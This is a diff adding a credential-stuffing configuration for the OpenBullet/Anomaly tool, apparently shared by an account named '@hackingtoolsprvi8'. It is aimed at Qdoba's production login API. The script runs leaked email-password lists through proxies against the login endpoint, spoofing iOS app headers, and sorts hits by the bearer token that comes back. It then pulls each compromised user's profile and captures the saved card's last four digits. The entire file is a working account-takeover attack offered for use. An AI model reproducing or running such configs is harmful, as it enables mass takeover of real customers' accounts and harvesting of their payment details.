@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "Qdoba(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-08T03:05:03.0005333+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://nomnom-prod-api.qdoba.com/user/login" 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"ignore\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: nomnom-prod-api.qdoba.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: capacitor://localhost" 
+  HEADER "Connection: keep-alive" 
+  HEADER "nomnom-platform: ios" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "clientid: qdoba" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "token_type\":\"bearer" 
+
+PARSE "<SOURCE>" JSON "authtoken" -> VAR "authtoken" 
+
+PARSE "<SOURCE>" JSON "providertoken" -> VAR "providertoken" 
+
+REQUEST GET "https://nomnom-prod-api.qdoba.com/users/<authtoken>" 
+  
+  HEADER "Host: nomnom-prod-api.qdoba.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: capacitor://localhost" 
+  HEADER "nomnom-platform: ios" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "clientid: qdoba" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" JSON "cardsuffix" CreateEmpty=FALSE -> CAP "cardLast4" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<cardLast4>" DoesNotMatchRegex "[0-9]" 
+  KEYCHAIN Retry OR 
+    KEY "<cardLast4>" DoesNotExist 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
